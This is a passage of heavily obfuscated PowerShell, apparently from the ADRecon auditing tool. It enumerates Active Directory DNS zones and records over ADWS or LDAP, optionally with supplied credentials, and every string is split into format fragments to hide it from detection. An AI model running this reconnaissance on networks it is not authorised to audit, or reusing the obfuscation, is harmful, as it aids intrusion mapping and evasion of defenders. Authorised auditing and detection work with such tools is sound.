            ${a`DDN`SzoNeS} = &("{0}{1}{2}" -f 'Get','-','ADObject') -LDAPFilter (("{4}{2}{1}{3}{0}"-f'e)','sZ','bjectClass=dn','on','(o')) -Properties ("{1}{0}"-f'me','Na'),("{1}{2}{0}" -f'ated','whenC','re'),("{0}{1}{2}" -f 'wh','enC','hanged'),("{1}{2}{0}{3}" -f'creat','us','n','ed'),("{2}{1}{0}"-f 'ed','ang','usnch'),("{3}{1}{2}{4}{0}"-f 'name','ng','u','disti','ished')
        }
        Catch
        {
            &("{3}{1}{0}{4}{2}"-f'a','-W','ng','Write','rni') ("{11}{0}{3}{16}{9}{7}{15}{13}{1}{4}{12}{5}{2}{10}{14}{8}{6}"-f 'Ge','r w','me','t','hi','nu','s','DR','Object','A','rating','[','le e','] Erro',' dnsZone ','DNSZone','-')
            &("{2}{1}{3}{0}"-f 'rbose','t','Wri','e-Ve') "[EXCEPTION] $($_.Exception.Message) "
        }

        ${dnsz`o`NEarRaY} = @()
        If (${ad`d`NszO`Nes})
        {
            ${d`N`SZon`EAR`Ray} += ${aDd`NsZ`O`NES}
            &("{1}{2}{0}{3}"-f'v','Re','mo','e-Variable') ("{2}{1}{0}"-f 'nes','NSZo','ADD')
        }

        Try
        {
            ${a`dDO`MaiN} = &("{1}{2}{0}" -f 'main','Ge','t-ADDo')
        }
        Catch
        {
            &("{1}{2}{3}{0}"-f 'g','Writ','e-Warn','in') ("{8}{5}{0}{6}{4}{7}{2}{3}{9}{1}"-f'Z','xt','getting',' Domai',' Erro','NS','one]','r ','[Get-ADRD','n Conte')
            &("{3}{1}{2}{0}"-f'Verbose','rite','-','W') "[EXCEPTION] $($_.Exception.Message) "
            Return ${Nu`LL}
        }

        Try
        {
            ${A`ddNszON`E`S1} = &("{1}{0}{2}"-f't-','Ge','ADObject') -LDAPFilter ("{1}{2}{3}{0}{4}" -f 'ss=dnsZon','(objec','tC','la','e)') -SearchBase "DC=DomainDnsZones,$($ADDomain.DistinguishedName)" -Properties ("{0}{1}"-f'N','ame'),("{2}{3}{0}{1}"-f 'reat','ed','when','C'),("{3}{2}{1}{0}"-f 'ed','hang','nC','whe'),("{1}{2}{0}"-f'reated','u','snc'),("{2}{3}{0}{1}"-f 'change','d','u','sn'),("{2}{4}{1}{0}{3}"-f 'guished','stin','d','name','i')
        }
        Catch
        {
            &("{2}{0}{1}"-f 'arni','ng','Write-W') "[Get-ADRDNSZone] Error while enumerating DC=DomainDnsZones,$($ADDomain.DistinguishedName) dnsZone Objects "
            &("{1}{0}{2}" -f'rite-V','W','erbose') "[EXCEPTION] $($_.Exception.Message) "
        }
        If (${addn`SzONE`s1})
        {
            ${DnS`ZOnEarR`Ay} += ${ADD`N`szoNE`s1}
            &("{3}{2}{0}{1}" -f'-Variab','le','ove','Rem') ("{1}{0}{2}"-f 'n','ADDNSZo','es1')
        }

        Try
        {
            ${aDDN`szoN`eS2} = &("{3}{1}{0}{2}"-f'jec','DOb','t','Get-A') -LDAPFilter (("{3}{1}{4}{0}{2}"-f 'dnsZ','ectC','one)','(obj','lass=')) -SearchBase "DC=ForestDnsZones,DC=$($ADDomain.Forest -replace '\.',',DC=')" -Properties ("{0}{1}"-f'Na','me'),("{3}{2}{1}{0}" -f'ted','ea','Cr','when'),("{3}{0}{2}{1}"-f 'he','d','nChange','w'),("{1}{2}{0}" -f 'eated','usnc','r'),("{1}{0}{2}" -f'ch','usn','anged'),("{3}{1}{2}{0}{4}" -f'shed','ti','ngui','dis','name')
        }
        Catch
        {
            &("{2}{3}{1}{0}" -f 'g','n','Wr','ite-Warni') "[Get-ADRDNSZone] Error while enumerating DC=ForestDnsZones,DC=$($ADDomain.Forest -replace '\.',',DC=') dnsZone Objects"
            &("{0}{1}{2}{3}"-f'Writ','e-Ve','rbo','se') "[EXCEPTION] $($_.Exception.Message) "
        }
        If (${aDd`N`sZO`NeS2})
        {
            ${D`Ns`ZoN`eArr`Ay} += ${AddnS`z`ones2}
            &("{2}{0}{3}{1}" -f'emove-','able','R','Vari') ("{2}{0}{1}"-f 'one','s2','ADDNSZ')
        }

        If (${AdD`Om`AiN})
        {
            &("{0}{1}{4}{2}{3}" -f 'Re','m','Var','iable','ove-') ("{0}{1}"-f 'ADDom','ain')
        }

        &("{1}{2}{3}{0}"-f 'se','Wr','ite','-Verbo') "[*] Total DNS Zones: $([ADRecon.ADWSClass]::ObjectCount($DNSZoneArray)) "

        If (${D`NsZ`on`eAr`RaY})
        {
            ${Ad`d`NszONE`sObJ} = @()
            ${aDdN`SnODESO`Bj} = @()
            ${D`NS`ZonEa`R`RaY} | &("{2}{0}{1}"-f '-O','bject','ForEach') {
                
                ${o`BJ} = &("{1}{0}{3}{2}" -f '-Obje','New','t','c') ("{1}{0}{2}" -f'bj','PSO','ect')
                ${o`BJ} | &("{1}{0}{3}{2}" -f '-','Add','r','Membe') -MemberType ("{1}{2}{0}" -f 'ty','N','oteProper') -Name ("{1}{0}" -f 'e','Nam') -Value $(  ( geT-VArIablE iT3V9E  -VaLueO)::("{2}{0}{1}"-f 'ea','nString','Cl').Invoke(${_}."NA`ME"))
                Try
                {
                    ${DNsN`o`dEs} = &("{2}{1}{0}{3}" -f'Objec','et-AD','G','t') -SearchBase $(${_}."diS`T`iNGuI`SheDnA`me") -LDAPFilter ("{0}{1}{3}{2}{4}" -f'(objectClas','s=d','ode','nsN',')') -Properties ("{2}{0}{4}{5}{3}{1}"-f'stingui','e','Di','m','shedN','a'),("{0}{1}{2}"-f 'dnsre','cor','d'),("{0}{3}{2}{1}" -f 'dNS','d','ne','Tombsto'),("{1}{0}" -f 'me','Na'),("{6}{4}{2}{5}{3}{1}{0}{7}"-f'et','ntalDel','t','e','rotec','edFromAccid','P','ion'),("{4}{1}{2}{3}{0}" -f'iewOnly','wInA','dvanc','edV','sho'),("{0}{1}{2}" -f'whenCha','nge','d'),("{1}{2}{0}" -f'd','whenCreat','e')
                }
                Catch
                {
                    &("{1}{0}{2}" -f 'arnin','Write-W','g') "[Get-ADRDNSZone] Error while enumerating $($_.DistinguishedName) dnsNode Objects "
                    &("{1}{2}{0}"-f'-Verbose','Wr','ite') "[EXCEPTION] $($_.Exception.Message) "
                }
                If (${D`NSnOD`eS})
                {
                    ${O`BJ} | &("{2}{1}{0}"-f 'Member','-','Add') -MemberType ("{3}{0}{1}{2}" -f 'r','o','perty','NoteP') -Name ("{1}{3}{2}{0}" -f 't','Reco','oun','rdC') -Value $(${dN`s`NOdEs} | &("{0}{3}{1}{2}" -f 'Measure-','bjec','t','O') | &("{1}{0}{2}{3}"-f't','Selec','-Obj','ect') -ExpandProperty ("{0}{1}"-f'C','ount'))
                    ${DNS`N`OdEs} | &("{1}{3}{2}{0}"-f't','F','ch-Objec','orEa') {
                        ${Ob`JnODe} = &("{1}{0}{2}"-f 'ew-','N','Object') ("{1}{2}{0}" -f'ect','PSOb','j')
                        ${oB`j`NODe} | &("{2}{1}{0}{3}"-f'b','d-Mem','Ad','er') -MemberType ("{1}{2}{0}{3}"-f 'er','Not','eProp','ty') -Name ("{0}{1}{2}" -f 'Z','oneN','ame') -Value ${o`Bj}."na`mE"
                        ${OBJ`N`odE} | &("{1}{2}{0}" -f'ber','Add-','Mem') -MemberType ("{1}{2}{0}{3}" -f'opert','NoteP','r','y') -Name ("{1}{0}" -f'e','Nam') -Value ${_}."NA`mE"
                        Try
                        {
                            ${Dn`srEC`oRD} = &("{3}{2}{0}{1}" -f 'SReco','rd','t-DN','Conver') ${_}."dnsr`E`CORd"[0]
                        }
                        Catch
                        {
                            &("{4}{3}{2}{0}{1}" -f'-Warni','ng','ite','r','W') ("{4}{3}{5}{2}{7}{10}{9}{8}{12}{1}{13}{14}{6}{0}{15}{11}" -f'SRe','ng ','e]','DN','[Get-ADR','SZon','DN',' Erro','er','conv','r while ','d','ti','t','he ','cor')
                            &("{2}{0}{3}{1}" -f'rite-','erbose','W','V') "[EXCEPTION] $($_.Exception.Message) "
                        }
                        ${OBJnO`DE} | &("{3}{2}{0}{1}"-f 'M','ember','d-','Ad') -MemberType ("{0}{2}{3}{1}"-f 'Not','ty','ePro','per') -Name ("{0}{1}{2}"-f 'Rec','o','rdType') -Value ${DN`S`REc`oRD}."R`e`c`orDtYPE"
                        ${OB`j`NoDE} | &("{2}{1}{0}" -f'er','Memb','Add-') -MemberType ("{3}{0}{2}{1}"-f'P','y','ropert','Note') -Name ("{0}{1}"-f'D','ata') -Value ${dnsrec`O`Rd}."dA`TA"
                        ${Obj`NODE} | &("{3}{2}{0}{1}" -f 'be','r','m','Add-Me') -MemberType ("{0}{2}{1}"-f'N','ty','oteProper') -Name ("{0}{1}"-f 'T','TL') -Value ${d`NsR`Ecord}."T`Tl"
                        ${OB`jN`ODE} | &("{1}{0}{2}"-f'-Membe','Add','r') -MemberType ("{2}{1}{0}{3}" -f'ePr','t','No','operty') -Name ("{0}{1}" -f'Ag','e') -Value ${Dn`sr`ecoRD}."A`ge"
                        ${O`BjnO`DE} | &("{2}{0}{1}" -f'd-Membe','r','Ad') -MemberType ("{3}{2}{1}{0}"-f 'y','rt','tePrope','No') -Name ("{2}{1}{0}" -f'tamp','eS','Tim') -Value ${d`N`SRECOrD}."tim`ES`TAMP"
                        ${OBj`No`de} | &("{2}{1}{0}" -f 'Member','-','Add') -MemberType ("{2}{1}{3}{0}" -f'ty','ope','NotePr','r') -Name ("{2}{1}{0}"-f'al','eri','UpdatedAtS') -Value ${dN`sR`E`CORd}."uPdatEdaTsE`R`iAl"
                        ${O`BjN`odE} | &("{0}{2}{3}{1}" -f'Ad','r','d','-Membe') -MemberType ("{1}{3}{0}{2}"-f 'r','No','operty','teP') -Name ("{0}{2}{1}" -f'whenCreat','d','e') -Value ${_}."W`hencR`EATEd"
                        ${O`BJN`oDe} | &("{1}{0}{2}" -f'dd','A','-Member') -MemberType ("{2}{0}{1}"-f 'oteP','roperty','N') -Name ("{1}{0}{2}"-f'hang','whenC','ed') -Value ${_}."wHEnC`Ha`Ng`eD"
                        
                        
                        
                        ${Obj`NO`DE} | &("{0}{1}{2}" -f 'Add-Mem','be','r') -MemberType ("{2}{0}{3}{1}" -f'ot','operty','N','ePr') -Name ("{4}{3}{1}{0}{2}" -f 'Advanc','n','edViewOnly','howI','s') -Value ${_}."sH`OW`inADVaNc`E`dviewo`NLy"
                        ${Ob`JnO`DE} | &("{1}{2}{0}" -f'er','Add','-Memb') -MemberType ("{2}{3}{1}{0}"-f 'operty','ePr','No','t') -Name ("{1}{2}{4}{0}{5}{3}" -f'd','Dist','i','me','nguishe','Na') -Value ${_}."D`ISTi`N`gUIsH`Ed`NAME"
                        ${addnsnO`D`Es`O`Bj} += ${o`Bj`NOdE}
                        If (${d`NSREc`orD})
                        {
                            &("{0}{1}{3}{4}{2}" -f'Remo','v','riable','e-V','a') ("{3}{2}{0}{1}"-f'r','d','NSReco','D')
                        }
                    }
                }
                Else
                {
                    ${o`BJ} | &("{1}{2}{0}"-f'r','Add-M','embe') -MemberType ("{2}{1}{0}{3}"-f'Propert','te','No','y') -Name ("{0}{1}{2}" -f'Rec','ordCoun','t') -Value ${Nu`ll}
                }
                ${O`Bj} | &("{1}{2}{0}"-f 'mber','Add-','Me') -MemberType ("{1}{2}{0}" -f'y','Not','ePropert') -Name ("{0}{3}{2}{1}" -f 'U','ed','reat','SNC') -Value ${_}."uSN`C`REat`ed"
                ${o`BJ} | &("{1}{2}{0}"-f 'er','Add','-Memb') -MemberType ("{0}{3}{1}{2}"-f'N','ePr','operty','ot') -Name ("{1}{2}{0}"-f 'nged','USNCh','a') -Value ${_}."us`NChaNg`ed"
                ${O`BJ} | &("{0}{1}{2}"-f'Ad','d','-Member') -MemberType ("{1}{2}{0}" -f 'erty','Not','eProp') -Name ("{1}{0}{2}"-f'nCre','whe','ated') -Value ${_}."wHeNcR`E`A`TEd"
                ${o`Bj} | &("{1}{0}{2}"-f'd-M','Ad','ember') -MemberType ("{1}{2}{0}" -f'Property','N','ote') -Name ("{1}{0}{2}"-f 'Ch','when','anged') -Value ${_}."whe`NCHaNG`ED"
                ${o`BJ} | &("{1}{0}{2}" -f'be','Add-Mem','r') -MemberType ("{0}{1}{3}{2}" -f 'NoteProp','e','y','rt') -Name ("{1}{0}{2}{3}" -f 'i','Distingu','shed','Name') -Value ${_}."D`I`STiNg`UIsheDN`AmE"
                ${A`DDNszo`Nesobj} += ${O`BJ}
            }
            &("{2}{1}{0}" -f 'rbose','-Ve','Write') "[*] Total DNS Records: $([ADRecon.ADWSClass]::ObjectCount($ADDNSNodesObj)) "
            &("{2}{0}{1}{3}" -f'ari','a','Remove-V','ble') ("{2}{1}{0}" -f 'ay','SZoneArr','DN')
        }
    }

    If (${ME`TH`Od} -eq ("{0}{1}"-f'L','DAP'))
    {
        ${Ob`JsEaRCH`Er} = &("{2}{0}{1}"-f'jec','t','New-Ob') ("{4}{6}{5}{3}{0}{2}{1}{7}"-f'S','vices.D','er','tory','Sy','tem.Direc','s','irectorySearcher') ${O`BJDoM`A`iN}
        ${OBJ`SEA`RcHer}."PA`gesi`ZE" = ${PaGE`sIze}
        ${o`B`jS`earCHer}."Pr`OPERT`iESt`OLo`AD".("{1}{2}{0}" -f'e','A','ddRang').Invoke((("{1}{0}"-f'me','na'),("{0}{1}{2}" -f'w','hencre','ated'),("{2}{0}{1}" -f 'g','ed','whenchan'),("{1}{2}{0}"-f'eated','usn','cr'),("{0}{2}{3}{1}" -f 'usnc','d','h','ange'),("{2}{0}{4}{3}{1}" -f's','dname','di','she','tingui')))
        ${Obj`S`EA`RCHer}."Fil`TEr" = (("{5}{0}{2}{4}{3}{1}" -f 'objec','one)','tCl','dnsZ','ass=','('))
        ${o`B`JSEArch`eR}."sEarC`HSc`o`Pe" = ("{1}{0}"-f 'tree','Sub')

        Try
        {
            ${AdDn`szo`NES} = ${O`BJsEArcH`Er}.("{0}{1}"-f 'FindAl','l').Invoke()
        }
        Catch
        {
            &("{3}{2}{1}{0}"-f'g','rnin','a','Write-W') ("{3}{10}{4}{14}{12}{5}{8}{1}{2}{6}{9}{0}{13}{7}{11}" -f 'dnsZ','l','e ','[Get','N','e] Err','enume','Objec','or whi','rating ','-ADRD','ts','on','one ','SZ')
            &("{4}{0}{3}{1}{2}"-f'r','V','erbose','ite-','W') "[EXCEPTION] $($_.Exception.Message) "
        }
        ${obj`SEAr`ChEr}.("{1}{0}{2}"-f 'pos','dis','e').Invoke()

        ${d`NSzoNeaRr`Ay} = @()
        If (${ADdnsz`O`N`ES})
        {
            ${dnsZ`ONEAr`R`Ay} += ${AdDN`s`ZOnES}
            &("{0}{2}{3}{1}" -f 'Remo','riable','ve','-Va') ("{2}{0}{1}" -f'NSZ','ones','ADD')
        }

        ${SE`ARc`hpAtH} = ("{2}{4}{3}{0}{5}{1}" -f'i','nsZones','D','ma','C=Do','nD')
        If (${crEde`N`Tial} -ne  (CHilDItem  VaRiAbLe:nK5p  ).VALuE::"emP`TY")
        {
            ${O`B`jsE`ArchpaTh} = &("{2}{0}{1}" -f'b','ject','New-O') ("{10}{3}{6}{8}{7}{2}{0}{4}{9}{1}{5}" -f '.D','toryEntr','s','t','ire','y','ory','ce','Servi','c','System.Direc') "LDAP://$($DomainController)/$($SearchPath),$($objDomain.distinguishedName)", ${CredEn`TI`AL}."uSErN`A`Me",${crEdeN`Ti`Al}.("{2}{4}{3}{1}{5}{0}"-f 'l','reden','GetNet','orkC','w','tia').Invoke()."pa`Ss`WORD"
        }
        Else
        {
            ${oBJSeAR`Ch`pA`TH} = &("{2}{0}{1}"-f'bjec','t','New-O') ("{9}{3}{0}{1}{4}{8}{11}{2}{6}{10}{7}{5}"-f'stem','.D','rvices','y','ire','try','.','En','cto','S','Directory','rySe') "LDAP://$($SearchPath),$($objDomain.distinguishedName)"
        }
        ${oB`jSEaRChER`PA`Th} = &("{0}{3}{1}{2}"-f 'New','b','ject','-O') ("{6}{1}{5}{0}{3}{4}{2}"-f 'vi','ystem.Di','ectorySearcher','ces.','Dir','rectorySer','S') ${O`BjsEAR`CH`pAtH}
        ${oBjSe`Ar`CHerP`ATh}."FI`ltEr" = (("{4}{0}{2}{1}{3}" -f'tCl','s=dnsZo','as','ne)','(objec'))
        ${obJSEArch`Er`P`ATH}."p`AgESi`Ze" = ${p`Ag`Esi`Ze}
        ${OBJ`SEar`chERpA`Th}."p`ROpErtI`e`StolOaD".("{0}{2}{1}" -f 'Ad','ge','dRan').Invoke((("{1}{0}"-f'me','na'),("{2}{3}{1}{0}"-f'ted','ea','when','cr'),("{3}{2}{0}{1}"-f 'hang','ed','nc','whe'),("{0}{2}{1}"-f 'u','eated','sncr'),("{2}{1}{0}"-f 'ed','ang','usnch'),("{3}{1}{2}{0}" -f'shedname','t','ingui','dis')))
        ${Objsea`R`ChER`Path}."sEa`R`chScOpE" = ("{2}{0}{1}"-f'ubt','ree','S')

        Try
        {
            ${A`ddns`zo`NeS1} = ${O`BJs`EA`RcHERPaTh}.("{1}{0}{2}"-f'nd','Fi','All').Invoke()
        }
        Catch
        {
            &("{1}{2}{0}" -f 'rning','Write-W','a') "[Get-ADRDNSZone] Error while enumerating $($SearchPath),$($objDomain.distinguishedName) dnsZone Objects. "
            &("{3}{0}{1}{2}" -f 'e-','Verbo','se','Writ') "[EXCEPTION] $($_.Exception.Message) "
        }
        ${o`BJS`eArc`He`RPAth}.("{2}{1}{0}"-f'se','po','dis').Invoke()

        If (${adD`N`szon`Es1})
        {
            ${dNszo`NEaR`R`AY} += ${aDd`N`szo`Nes1}
            &("{1}{0}{2}{3}{4}"-f'-','Remove','V','a','riable') ("{0}{1}{2}" -f 'ADDN','SZone','s1')
        }

        ${seA`R`CHpatH} = ("{4}{2}{0}{3}{1}"-f 'restDn','nes','Fo','sZo','DC=')
        If (${CreD`EnT`IaL} -ne  (  GeT-VARIabLE  ("nk5"+"P")  ).VaLUe::"em`pTy")
        {
            ${dOm`A`Inf`qDN} = &("{2}{1}{0}"-f 'DN','-DNtoFQ','Get')(${OBJDOM`A`in}."dIstIn`guI`S`H`EDName")
            ${DOm`A`iN`CO`NTEXT} = &("{1}{0}{2}" -f'-Obj','New','ect') ("{9}{0}{6}{7}{4}{10}{1}{3}{2}{8}{11}{5}" -f'em.D','Service','ct','s.A','ector','ectoryContext','i','r','iveD','Syst','y','irectory.Dir')(("{0}{1}" -f'Dom','ain'),$(${d`om`A`inFQDn}),$(${Cr`ED`en`TIAL}."US`ernA`me"),$(${CR`ED`E`NtIAL}.("{4}{1}{3}{2}{0}"-f 'ial','NetworkCre','ent','d','Get').Invoke()."pa`Ssw`orD"))
            Try
            {
                ${A`D`Domain} =   (dir  VaRIable:lbFuD2  ).value::("{1}{0}{2}" -f 'etDo','G','main').Invoke(${DoM`A`inc`oNText})
            }
            Catch
            {
                &("{3}{0}{2}{1}" -f 'r','g','nin','Write-Wa') ("{5}{6}{9}{11}{1}{3}{10}{4}{2}{7}{0}{8}"-f 'x','r','ing Do','o','tt','[Get','-ADR','main Conte','t','Fo','r ge','rest] Er')
                &("{3}{1}{0}{2}"-f'bos','e-Ver','e','Writ') "[EXCEPTION] $($_.Exception.Message) "
                Return ${NU`lL}
            }
            &("{0}{3}{2}{1}" -f 'Re','able','Vari','move-') ("{0}{2}{3}{4}{1}"-f'Do','t','mai','nCont','ex')
            ${OB`JS`eARchPA`Th} = &("{0}{2}{1}"-f 'New-Ob','ct','je') ("{8}{3}{5}{4}{6}{7}{2}{0}{1}"-f'es.Dire','ctoryEntry','c','m.Dir','yS','ector','e','rvi','Syste') "LDAP://$($DomainController)/$($SearchPath),DC=$($ADDomain.Forest.Name -replace '\.',',DC=')", ${cr`edeN`T`IAL}."Us`E`RnAMe",${cReD`eN`TI`Al}.("{3}{0}{1}{2}{4}" -f'or','kCr','e','GetNetw','dential').Invoke()."Pass`W`oRD"
        }
        Else
        {
            ${A`dDoM`A`in} =  $LBFuD2::("{2}{0}{1}{3}"-f 'et','Cu','G','rrentDomain').Invoke()
            ${obJ`sEar`chpAtH} = &("{2}{1}{0}" -f't','bjec','New-O') ("{1}{7}{4}{0}{5}{2}{6}{3}" -f 'orySe','S','.DirectoryE','try','ect','rvices','n','ystem.Dir') "LDAP://$($SearchPath),DC=$($ADDomain.Forest.Name -replace '\.',',DC=')"
        }

        ${OBjsea`RCHe`RPatH} = &("{2}{0}{1}{3}"-f 'bj','e','New-O','ct') ("{7}{6}{10}{0}{9}{2}{3}{1}{5}{8}{4}"-f 'Servi','e','es.Director','yS','er','a','ystem.Dire','S','rch','c','ctory') ${ObJ`S`EARcHPa`Th}
        ${obJSEa`RCHeRp`A`Th}."Fi`lTeR" = ("{1}{4}{0}{3}{5}{2}"-f 's','(objectCl',')','=dns','as','Zone')
        ${O`Bjs`eARcH`eRPath}."Pa`geS`Ize" = ${PAg`Es`Ize}
        ${oBJS`EaRCHER`PA`Th}."p`R`opErT`IeSToLOaD".("{1}{0}" -f'nge','AddRa').Invoke((("{0}{1}" -f'na','me'),("{1}{3}{0}{2}"-f'ncre','w','ated','he'),("{2}{0}{1}{3}" -f'henchan','ge','w','d'),("{1}{2}{0}" -f'ed','usnc','reat'),("{1}{0}{2}"-f 'hang','usnc','ed'),("{0}{2}{3}{4}{1}{5}"-f'd','guishedn','is','ti','n','ame')))
        ${obJSE`ARc`h`ERpATh}."SE`ARC`HScopE" = ("{0}{1}{2}" -f'Sub','t','ree')

        Try
        {
            ${AdDNszo`Ne`s2} = ${OBJsEA`RchER`PAth}.("{0}{1}{2}" -f'F','in','dAll').Invoke()
        }
        Catch
        {
            &("{2}{3}{4}{0}{1}"-f'a','rning','W','rite','-W') "[Get-ADRDNSZone] Error while enumerating $($SearchPath),DC=$($ADDomain.Forest.Name -replace '\.',',DC=') dnsZone Objects."
            &("{4}{2}{1}{0}{3}" -f'rbo','te-Ve','i','se','Wr') "[EXCEPTION] $($_.Exception.Message) "
        }
        ${oBJ`SEa`Rc`HerPATH}.("{0}{1}{2}"-f 'dis','po','se').Invoke()

        If (${Add`N`szOn`eS2})
        {
            ${dNSz`oNE`ARR`Ay} += ${a`DDnSzo`NeS2}
            &("{3}{2}{1}{0}" -f'iable','r','a','Remove-V') ("{2}{1}{0}" -f 's2','e','ADDNSZon')
        }

        If(${Ad`DoM`AIN})
        {
            &("{2}{0}{3}{1}"-f 've-V','le','Remo','ariab') ("{2}{0}{1}"-f'D','omain','AD')
        }

        &("{2}{1}{0}{3}" -f'-Ver','e','Writ','bose') "[*] Total DNS Zones: $([ADRecon.LDAPClass]::ObjectCount($DNSZoneArray)) "

        If (${DNszoNe`A`RR`AY})
        {
            ${A`dd`NszONeSobj} = @()
            ${AdDn`sNodeso`BJ} = @()
            ${dnSz`One`ARRAY} | &("{0}{2}{3}{1}" -f'F','t','or','Each-Objec') {
                If (${cRE`deNTI`Al} -ne  (lS VarIable:nK5P).VaLUE::"emp`Ty")
                {
                    ${OBJsEA`RCH`PatH} = &("{0}{2}{1}"-f'Ne','-Object','w') ("{3}{4}{2}{5}{1}{0}{6}"-f'.Direc','es','ire','System','.D','ctoryServic','toryEntry') "LDAP://$($DomainController)/$($_.Properties.distinguishedname)", ${cRE`denTi`AL}."User`N`AME",${crE`D`eNTIAL}.("{3}{4}{5}{1}{2}{6}{0}"-f'l','rkCr','eden','Get','Netw','o','tia').Invoke()."pass`W`ord"
                }
                Else
                {
                    ${oBjSeAR`C`hPATH} = &("{0}{1}{2}" -f 'New-','O','bject') ("{1}{7}{3}{4}{5}{2}{0}{6}"-f 'ntr','System.','.DirectoryE','rec','tory','Services','y','Di') "LDAP://$($_.Properties.distinguishedname)"
                }
                ${OBjSEar`ChEr`pa`TH} = &("{1}{0}{2}" -f 'Ob','New-','ject') ("{9}{0}{1}{2}{8}{4}{5}{6}{3}{10}{7}"-f 'em.','Di','r','ec','es','.Di','r','r','ectoryServic','Syst','torySearche') ${o`Bj`sEARc`hPath}
                ${Ob`JSea`R`cheRPa`TH}."FilT`eR" = ("{0}{5}{1}{4}{2}{3}"-f'(','lass=','Nod','e)','dns','objectC')
                ${OB`jSEaRChE`R`P`ATh}."PAGes`IzE" = ${PAG`e`SiZE}
                ${oB`J`SeAr`ChE`Rpath}."PRO`PErtIes`T`OlOAD".("{2}{1}{0}"-f 'ge','Ran','Add').Invoke((("{4}{2}{3}{0}{1}" -f'ed','name','ng','uish','disti'),("{0}{1}{2}" -f 'dns','r','ecord'),("{1}{0}" -f 'me','na'),"dc",("{0}{3}{2}{4}{1}" -f 's','viewonly','nadvanc','howi','ed'),("{1}{2}{0}{3}" -f'an','whenc','h','ged'),("{0}{1}{2}" -f 'w','hencre','ated')))
                Try
                {
                    ${d`NsNO`dES} = ${O`BJ`sEarcHE`RpAtH}.("{0}{2}{1}" -f'Fi','l','ndAl').Invoke()
                }
                Catch
                {
                    &("{1}{3}{0}{2}" -f 'Warnin','Write','g','-') "[Get-ADRDNSZone] Error while enumerating $($_.Properties.distinguishedname) dnsNode Objects "
                    &("{2}{0}{1}"-f 'os','e','Write-Verb') "[EXCEPTION] $($_.Exception.Message) "
                }
                ${obJSe`A`RC`He`R`paTH}.("{1}{0}" -f'spose','di').Invoke()
                &("{0}{2}{1}" -f'Re','ve-Variable','mo') ("{0}{4}{1}{3}{2}" -f 'obj','ar','Path','ch','Se')

                
                ${o`Bj} = &("{2}{0}{1}" -f'ew-O','bject','N') ("{1}{0}{2}" -f'b','PSO','ject')
                ${o`Bj} | &("{2}{1}{0}"-f'r','dd-Membe','A') -MemberType ("{1}{2}{0}"-f 'ty','Note','Proper') -Name ("{1}{0}"-f'e','Nam') -Value $(  $D761P::"Cle`AnsTR`i`Ng"(${_}."P`ROp`ER`TIeS"."N`AMe"[0]))
                If (${Dn`sN`oDes})
                {
                    ${o`BJ} | &("{0}{1}{2}"-f 'Add-','M','ember') -MemberType ("{1}{0}{2}"-f 'rope','NoteP','rty') -Name ("{2}{0}{3}{1}" -f'ecordCo','nt','R','u') -Value $(${D`N`sn`oDes} | &("{2}{1}{0}" -f'ct','bje','Measure-O') | &("{3}{2}{0}{4}{1}"-f 'bje','t','elect-O','S','c') -ExpandProperty ("{1}{0}" -f 'ount','C'))
                    ${d`N`snOD`es} | &("{3}{0}{1}{2}" -f'ach-O','bj','ect','ForE') {
                        ${o`Bjn`OdE} = &("{2}{1}{0}"-f 'ct','ew-Obje','N') ("{0}{2}{1}"-f'PSOb','ect','j')
                        ${obj`N`oDE} | &("{2}{0}{1}"-f '-M','ember','Add') -MemberType ("{2}{1}{0}{3}" -f'er','rop','NoteP','ty') -Name ("{1}{2}{0}"-f'Name','Z','one') -Value ${O`Bj}."Na`me"
                        ${N`AME} = ([string] $(${_}."prO`pE`Rt`Ies"."nA`ME"))
                        If (-Not ${N`Ame})
                        {
                            ${Na`me} = ([string] $(${_}."p`RO`peRTIEs"."dC"))
                        }
                        ${o`BJNo`dE} | &("{0}{2}{1}" -f'A','mber','dd-Me') -MemberType ("{3}{0}{2}{1}" -f 'ote','operty','Pr','N') -Name ("{1}{0}" -f'me','Na') -Value ${n`AMe}
                        Try
                        {
                            ${Dn`sRE`cORd} = &("{3}{1}{0}{2}" -f'ert-DN','v','SRecord','Con') ${_}."PROpEr`T`iEs"."DN`SrEc`OrD"[0]
                        }
                        Catch
                        {
                            &("{3}{2}{0}{1}{4}"-f'-W','arn','rite','W','ing') ("{4}{1}{5}{9}{7}{8}{10}{6}{2}{0}{3}" -f'R','G',' DNS','ecord','[','et-ADRDNSZone] Er','g the','while conve','rt','ror ','in')
                            &("{1}{0}{2}{3}"-f 'it','Wr','e-Verbos','e') "[EXCEPTION] $($_.Exception.Message) "
                        }
                        ${OB`JNo`dE} | &("{2}{1}{0}"-f 'Member','-','Add') -MemberType ("{2}{1}{0}"-f 'perty','tePro','No') -Name ("{1}{2}{0}" -f'e','Record','Typ') -Value ${DnsR`EC`OrD}."R`E`COrdtyPe"
                        ${o`Bjn`oDe} | &("{1}{0}{2}" -f 'd-M','Ad','ember') -MemberType ("{3}{0}{2}{1}"-f 'ot','Property','e','N') -Name ("{0}{1}"-f'Dat','a') -Value ${dN`sreCO`RD}."d`AtA"
                        ${ob`JNO`De} | &("{2}{1}{0}"-f'Member','-','Add') -MemberType ("{1}{2}{0}{3}" -f't','NoteProp','er','y') -Name ("{0}{1}"-f 'TT','L') -Value ${Dn`S`R`ecOrd}."t`TL"
                        ${o`B`Jnode} | &("{0}{1}{2}" -f 'Add-','Memb','er') -MemberType ("{0}{1}{2}" -f'Note','P','roperty') -Name ("{1}{0}" -f 'e','Ag') -Value ${dN`sR`E`COrD}."a`ge"
                        ${Objn`ODe} | &("{2}{1}{0}"-f'mber','-Me','Add') -MemberType ("{2}{1}{0}" -f'Property','ote','N') -Name ("{0}{1}{2}" -f 'Tim','eSt','amp') -Value ${dNsre`c`oRD}."tImE`sTA`mP"
                        ${Objn`Ode} | &("{2}{0}{1}" -f '-Me','mber','Add') -MemberType ("{1}{3}{0}{2}"-f'ope','Note','rty','Pr') -Name ("{3}{2}{4}{0}{1}" -f'edAtSeria','l','pda','U','t') -Value ${DnS`R`ECORd}."u`pdaTedat`sERiAL"
                        ${O`BJnO`dE} | &("{1}{2}{0}"-f 'Member','A','dd-') -MemberType ("{3}{2}{1}{0}"-f 'ty','oper','tePr','No') -Name ("{3}{2}{0}{1}"-f'r','eated','henC','w') -Value ([DateTime] $(${_}."P`Ro`Pert`IEs"."WHENC`R`eATEd"))
